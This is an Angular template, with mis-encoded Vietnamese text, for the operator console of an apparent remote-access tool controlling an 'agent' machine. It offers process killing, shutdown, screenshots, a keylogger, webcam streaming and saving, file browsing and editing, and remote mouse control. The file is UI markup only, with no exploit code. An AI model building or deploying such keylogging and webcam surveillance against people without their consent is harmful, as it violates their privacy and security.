<!-- ======================== LOADING ========================= -->
<ng-template #loadingTpl>
  <div class="page">
    <h3>Äang táº£i...</h3>
  </div>
</ng-template>

<!-- ======================== MAIN PAGE ======================== -->
<div class="page" *ngIf="!loading(); else loadingTpl">

  <!-- HEADER -->
  <h1>Äiá»u khiá»ƒn Agent: {{ agent?.machineId }}</h1>
  <div class="subtitle">Báº£ng Ä‘iá»u khiá»ƒn realtime â€“ giao diá»‡n hiá»‡n Ä‘áº¡i</div>

  <!-- =================== TOP INFO =================== -->
  <div class="grid-2">

    <!-- LEFT CARD -->
    <section class="card">
      <h2>ThÃ´ng tin Agent</h2>

      <div><b>Machine ID:</b> {{ agent?.machineId }}</div>
      <div><b>IP:</b> {{ agent?.ip }}</div>
      <div><b>OS:</b> {{ agent?.os }}</div>
      <div><b>WS Port:</b> {{ agent?.wsPort }}</div>

      <div style="margin-top:10px;">
        <b>Registry tráº¡ng thÃ¡i:</b>
        <span class="status-pill" [ngClass]="agent?.online ? 'pill-online' : 'pill-offline'">
          â— {{ agent?.online ? 'Online' : 'Offline' }}
        </span>
      </div>

      <button class="btn" style="margin-top:14px;" (click)="connectWS()" [disabled]="!agent?.online">
        ğŸ”Œ Káº¿t ná»‘i WebSocket
      </button>
    </section>

    <!-- RIGHT CARD -->
    <section class="card">
      <h2>WebSocket</h2>

      <div><b>Status:</b> {{ ws.status() }}</div>

      <!-- chá»— nÃ y báº¡n cÃ³ thá»ƒ hiá»ƒn thá»‹ lastMessage Ä‘á»ƒ debug náº¿u muá»‘n -->
    </section>

  </div>

  <!-- =================== MODULE MENU =================== -->
  <section class="card modules-card">

    <h2>Modules</h2>

    <!-- MENU -->
    <div *ngIf="!selectedModule()">
      <div class="module-grid">
        <button class="module-btn" (click)="openModule('PROCESS')">ğŸ”§ PROCESS</button>
        <button class="module-btn" (click)="openModule('SYSTEM')">ğŸ’» SYSTEM</button>
        <button class="module-btn" (click)="openModule('SCREEN')">ğŸ–¼ SCREEN</button>
        <button class="module-btn" (click)="openModule('APP')">ğŸ“‚ APPS</button>
        <button class="module-btn" (click)="openModule('KEYLOGGER')">âŒ¨ KEYLOGGER</button>
        <button class="module-btn" (click)="openModule('WEBCAM')">ğŸ“· WEBCAM</button>
        <button class="module-btn" (click)="openModule('EXPLORER')">ğŸ“ EXPLORER</button>
        <button class="module-btn" (click)="openModule('REMOTE')">ğŸ® REMOTE</button>
        <button class="module-btn" (click)="openModule('GALLERY')">ğŸ GALLERY</button>
      </div>
    </div>

    <!-- ========== PROCESS MANAGER ========== -->
<div *ngIf="selectedModule() === 'PROCESS'" class="section-card">
  <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>

  <h3 class="section-title">ğŸ”§ Process Manager</h3>

  <!-- ==== NEW INPUT ACTION BAR ==== -->
  <div class="process-action-bar">

  <div class="action-group">
    <button class="btn" (click)="sendProcessList()">ğŸ“‹ LIST</button>
  </div>

  <div class="action-group">
    <button class="btn btn-danger" (click)="killProcess(killPid)">ğŸ—‘ KILL</button>
    <input class="input-box" type="number" placeholder="PID cáº§n killâ€¦" [(ngModel)]="killPid">
  </div>

  <div class="action-group">
    <button class="btn" (click)="startProcess()">â• STARTâ€¦</button>
    <input class="input-box" type="text" placeholder="TÃªn process cáº§n start..." [(ngModel)]="startExeName">
  </div>

</div>


  <!-- ==== TABLE WITH SCROLL ==== -->
  <div class="table-scroll">
    <table *ngIf="processList().length">
      <thead>
        <tr>
          <th>PID</th>
          <th>Name</th>
          <th>Threads</th>
          <th></th>
        </tr>
      </thead>
      <tbody>
        <tr *ngFor="let p of processList()">
          <td>{{ p.pid }}</td>
          <td>{{ p.exe || p.name }}</td>
          <td>{{ p.count || p.threads }}</td>
          <td>
            <button class="btn btn-danger" (click)="killProcess(p.pid)">KILL</button>
          </td>
        </tr>
      </tbody>
    </table>

    <div *ngIf="!processList().length" class="placeholder">
      ChÆ°a cÃ³ dá»¯ liá»‡u â€“ báº¥m LIST Ä‘á»ƒ load thÃ´ng tin.
    </div>
  </div>
</div>


    <!-- ========== SYSTEM CONTROL ========== -->
    <div *ngIf="selectedModule() === 'SYSTEM'" class="section-card">
      <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>

      <h3 class="section-title">ğŸ’» System Control</h3>

      <div class="btn-bar">
        <button class="btn btn-danger" (click)="sendSystemShutdown()">Shutdown</button>
        <button class="btn btn-danger" (click)="sendSystemRestart()">Restart</button>
        <!-- <button class="btn" (click)="sendSystemLogoff()">Logoff</button>
        <button class="btn" (click)="sendSystemLock()">Lock</button> -->
      </div>
    </div>

    <!-- ========== SCREENSHOT ========== -->
    <div *ngIf="selectedModule() === 'SCREEN'" class="section-card">
      <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>
      <h3 class="section-title">ğŸ–¼ Screenshot</h3>

      <div class="btn-bar">
        <button class="btn" (click)="sendScreenCaptureBinary()">ğŸ“· Capture</button>
        <button class="btn btn-secondary" (click)="clearScreenshot()">Clear</button>
      </div>

      <div class="screen-preview">
        <ng-container *ngIf="screenshot() as shot; else noScreen">
          <img [src]="shot" alt="Screenshot" />
        </ng-container>

        <ng-template #noScreen>
          <div class="placeholder">ChÆ°a cÃ³ screenshot</div>
        </ng-template>
      </div>
    </div>

<!-- ========== APP MANAGER (UNIFIED UI) ========== -->
<div *ngIf="selectedModule() === 'APP'" class="section-card">

  <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>

  <h3 class="section-title">ğŸ“ APP MANAGER</h3>

  <!-- ==== NEW UNIFIED ACTION BAR ==== -->
  <div class="process-action-bar">

    <!-- LIST -->
    <div class="action-group">
      <button class="btn" (click)="sendAppList()">ğŸ“‹ LIST</button>
    </div>

    <!-- KILL -->
    <div class="action-group">
      <button class="btn btn-danger" (click)="killApp(killExeName)">ğŸ—‘ KILL</button>
      <input class="input-box" type="text" placeholder="TÃªn app cáº§n killâ€¦" [(ngModel)]="killExeName">
    </div>

    <!-- START -->
    <div class="action-group">
      <button class="btn" (click)="sendAppStart()">â• STARTâ€¦</button>
      <input class="input-box" type="text" placeholder="TÃªn app cáº§n startâ€¦" [(ngModel)]="startExeName">
    </div>

  </div>

  <!-- ==== TABLE WITH SCROLL ==== -->
  <div class="table-scroll" *ngIf="appList().length">

    <table>
      <thead>
        <tr>
          <th>EXE</th>
          <th>PROCESS COUNT</th>
          <th></th>
        </tr>
      </thead>
      <tbody>
        <tr *ngFor="let app of appList()">
          <td>{{ app.exe }}</td>
          <td>{{ app.count }}</td>
          <td>
            <button class="btn btn-danger" (click)="killAppAll(app.exe)">KILL ALL</button>
          </td>
        </tr>
      </tbody>
    </table>

  </div>

  <div *ngIf="!appList().length" class="placeholder">
    Báº¥m LIST Ä‘á»ƒ táº£i danh sÃ¡ch á»©ng dá»¥ng.
  </div>

</div>




    <!-- ========== KEYLOGGER ========== -->
<div *ngIf="selectedModule() === 'KEYLOGGER'" class="section-card">
  
  <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>

  <h3 class="section-title">âŒ¨ KEYLOGGER</h3>

  <!-- BUTTON BAR -->
  <div class="btn-bar">
    <button class="btn" (click)="sendKeyloggerStart()">START</button>
    <button class="btn btn-danger" (click)="sendKeyloggerStop()">STOP</button>
    <button class="btn" (click)="sendKeyloggerLock()">ğŸ”’ LOCK</button>
    <button class="btn" (click)="sendKeyloggerUnlock()">ğŸ”“ UNLOCK</button>
    <button class="btn btn-secondary" (click)="clearKeylogs()">CLEAR</button>
  </div>

  <!-- TEXT LOG AREA -->
  <div id="keylog-box" class="keylog-output">
    <div *ngIf="ws.keylogList().length === 0" class="placeholder-text">
      ChÆ°a cÃ³ log.
    </div>

    <!-- Gá»™p táº¥t cáº£ keylog thÃ nh vÄƒn báº£n -->
    <pre class="keylog-text">
{{ keylogText }}
    </pre>
  </div>

</div>

    <!-- ========== WEBCAM STREAM ==========
    <div *ngIf="selectedModule() === 'WEBCAM'" class="section-card">
      <canvas #webcamCanvas hidden></canvas>

      <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>

      <h3 class="section-title">ğŸ“· Webcam Stream</h3>

      <div class="btn-bar">
        <button class="btn" (click)="sendWebcamStartStream()">â–¶ Start Stream</button>
        <button class="btn btn-danger" (click)="sendWebcamStopStream()">â¹ Stop &amp; Save</button>
      </div>

      <div class="webcam-preview">
        <ng-container *ngIf="webcamFrame() as frame; else noCam">
          <img [src]="frame" />
        </ng-container>

        <ng-template #noCam>
          <div class="placeholder">KhÃ´ng cÃ³ stream.</div>
        </ng-template>
      </div>
    </div> -->
    <!-- WEBCAM MODULE -->
<div *ngIf="selectedModule() === 'WEBCAM'" class="section-card">

  <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>
  <h3 class="section-title">ğŸ“· Webcam Stream</h3>

  <div class="btn-bar">
    <button class="btn" (click)="sendWebcamStartStream()">â–¶ Start Stream</button>
    <button class="btn btn-danger" (click)="sendWebcamStopStream()">â¹ Stop & Save</button>
  </div>

  <div class="webcam-preview">
    <img *ngIf="ws.webcamFrameUrl() as frame" [src]="frame">
    <div *ngIf="!ws.webcamFrameUrl()" class="placeholder">KhÃ´ng cÃ³ stream.</div>
  </div>

  <!-- CANVAS ghi video -->
  <canvas #webcamCanvas hidden></canvas>
</div>




<!-- GALLERY MODULE -->
<div *ngIf="selectedModule() === 'GALLERY'" class="section-card">

  <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>
  <h3 class="section-title">ğŸ Gallery</h3>

  <div class="btn-bar">
    <button class="btn" (click)="reloadGallery()">â†» Reload List</button>
  </div>

  <div class="gallery-scroll">
    <table *ngIf="ws.galleryItems().length">
      <thead>
        <tr>
          <th>NAME</th>
          <th>SIZE (KB)</th>
        </tr>
      </thead>
      <tbody>
        <tr *ngFor="let g of ws.galleryItems()"
            (click)="openGalleryItem(g)">
          <td>{{ g.name }}</td>
          <td>{{ g.size ? (g.size / 1024 | number:'1.1-1') : '' }}</td>
        </tr>
      </tbody>
    </table>
  </div>

  <div *ngIf="!ws.galleryItems().length" class="placeholder">
    ChÆ°a cÃ³ file media.
  </div>

  <!-- HIá»‚N THá»Š MEDIA -->
  <div *ngIf="ws.viewingFile() as file">
  
  <!-- VIDEO -->
  <video *ngIf="isVideo(file.name)"
         [src]="ws.mediaUrl()"
         controls autoplay
         style="max-width:100%; margin-top:15px; border-radius:8px;">
  </video>

  <!-- IMAGE -->
  <img *ngIf="isImage(file.name)"
       [src]="ws.mediaUrl()"
       style="max-width:100%; margin-top:15px; border-radius:8px;">
   
  </div>
</div>


    <!-- ========== EXPLORER ========== -->
    <div *ngIf="selectedModule() === 'EXPLORER'" class="section-card">
      <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>

      <h3 class="section-title">ğŸ“ Explorer</h3>

      <div class="btn-bar">
        <button class="btn" (click)="explorerGoRoot()">My Computer</button>
        <button class="btn" (click)="explorerRefresh()">Refresh</button>
        <button class="btn" (click)="explorerBack()">â¬… Back</button>
      </div>

      <div style="font-size:11px; margin-bottom:4px;">
        Current path:
        <span>{{ currentExplorerPath() || 'ROOT' }}</span>
      </div>

      <!-- <table *ngIf="explorerItems().length">
        <thead>
          <tr>
            <th>TYPE</th>
            <th>NAME</th>
          </tr>
        </thead>
        <tbody>
          <tr *ngFor="let item of explorerItems()" (dblclick)="explorerOpen(item)">
            <td>{{ item.type }}</td>
            <td>{{ item.name }}</td>
          </tr>
        </tbody>
      </table> -->
      <div class="explorer-grid" *ngIf="explorerItems().length">
        <div class="explorer-item"
          *ngFor="let item of explorerItems()"
           (dblclick)="onExplorerItemDblClick(item)">

           <div class="icon-emoji">{{ getExplorerIcon(item) }}</div>
           <div class="label">{{ item.name }}</div>

        </div>
      </div>


      <div *ngIf="!explorerItems().length" class="placeholder">
        Báº¥m "My Computer" Ä‘á»ƒ táº£i danh sÃ¡ch á»• Ä‘Ä©a / thÆ° má»¥c.
      </div>
    </div>

    <!-- ========== REMOTE CONTROL ========== -->
    <div *ngIf="selectedModule() === 'REMOTE'" class="section-card">
      <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>

      <h3 class="section-title">ğŸ® Remote Control</h3>

      <div class="btn-bar">
        <button class="btn" (click)="toggleRemote()">
          {{ remoteActive() ? 'â¹ Stop Remote' : 'â–¶ Start Remote' }}
        </button>
      </div>

      <div class="screen-preview">
        <ng-container *ngIf="screenshot() as shot; else noRemoteShot">
          <img
            [src]="shot"
            alt="Remote Screen"
            (mousemove)="onRemoteMouseMove($event)"
            (mousedown)="onRemoteMouseDown($event)"
            (mouseup)="onRemoteMouseUp($event)"
            (wheel)="onRemoteWheel($event)"
            (contextmenu)="onRemoteContextMenu($event)"
          />
        </ng-container>

        <ng-template #noRemoteShot>
          <div class="placeholder">ChÆ°a cÃ³ frame remote. Báº¥m Start Remote.</div>
        </ng-template>
      </div>
    </div>
    <!-- ============================================================
     â­ REMOTE FILE EDITOR MODAL â€” HIá»†N KHI Má» FILE TRONG EXPLORER
=============================================================== -->
<div class="editor-backdrop" *ngIf="editorOpen()" (click)="closeEditor()"></div>

<div class="editor-modal" *ngIf="editorOpen()">
  
  <div class="editor-header">
    <div class="editor-title">
      âœï¸ Editing: {{ editorPath() }}
    </div>

    <div class="editor-buttons">
      <button class="btn-save" (click)="saveEditorFile()">ğŸ’¾ Save</button>
      <button class="btn-close" (click)="closeEditor()">âœ– Close</button>
    </div>
  </div>

  <textarea
    class="editor-textarea"
    [value]="editorContent()"
    (input)="updateEditorText($event)"
    spellcheck="false"
  ></textarea>

</div>


    <!-- ========== GALLERY ==========
    <div *ngIf="selectedModule() === 'GALLERY'" class="section-card">
      <button class="btn btn-secondary" (click)="backToModules()">â† Modules</button>

      <h3 class="section-title">ğŸ Gallery</h3>

      <div class="btn-bar">
        <button class="btn" (click)="reloadGallery()">â†» Reload List</button>
      </div>

      <table *ngIf="galleryItems().length">
        <thead>
          <tr>
            <th>NAME</th>
            <th>SIZE (KB)</th>
          </tr>
        </thead>
        <tbody>
          <tr *ngFor="let g of galleryItems()" (click)="openGalleryItem(g)">
            <td>{{ g.name }}</td>
            <td>
              {{
                g.size
                  ? ((g.size / 1024) | number:'1.1-1')
                  : ''
              }}
            </td>
          </tr>
        </tbody>
      </table>

      <div *ngIf="!galleryItems().length" class="placeholder">
        ChÆ°a cÃ³ file media â€“ hÃ£y stream vÃ  lÆ°u video trÆ°á»›c.
      </div>
    </div> -->

  </section>

</div>
